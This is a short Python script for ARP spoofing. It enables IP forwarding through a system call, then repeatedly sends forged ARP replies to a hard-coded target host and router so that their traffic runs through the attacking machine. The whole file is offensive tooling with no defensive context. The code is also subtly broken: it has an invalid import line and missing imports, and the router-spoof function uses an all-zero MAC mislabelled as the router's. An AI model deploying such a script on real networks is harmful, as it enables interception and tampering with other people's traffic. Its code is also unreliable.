from time import sleep()
import uuid, re, os

# Enable fowarding:
os.system("sysctl -w net.ipv4.ip_forward=1")

# Generate response:
def target_spoof():
    # Create packet:
    arp_response = ARP()
    arp_response.op = 2 # Response, not request!
    arp_response.psrc = "192.168.0.1" # Router address.
    arp_response.hwsrc = ':'.join(re.findall('..', '%012x' % uuid.getnode())) # This is the host's MAC address.
    arp_response.pdst = "192.168.0.8" # Target IP address.
    arp_response.hwdst = "" # Target MAC address.
    # Send:
    send(arp_response)

# Router spoof:
def router_spoof():
    # Create packet:
    arp_response = ARP()
    arp_response.op = 2 # Response, not request!
    arp_response.psrc = "192.168.0.8" # Target address.
    arp_response.hwsrc = "00:00:00:00:00:00" # Router's MAC address.
    arp_response.pdst = "192.168.0.1" # Router IP address.
    arp_response.hwdst = "" # Router MAC address.
    # Send:
    send(arp_response)

try:
    while True:
        target_spoof()
        router_spoof()
        sleep(5)
except KeyboardInterrupt as excpt:
    print("Closing...")
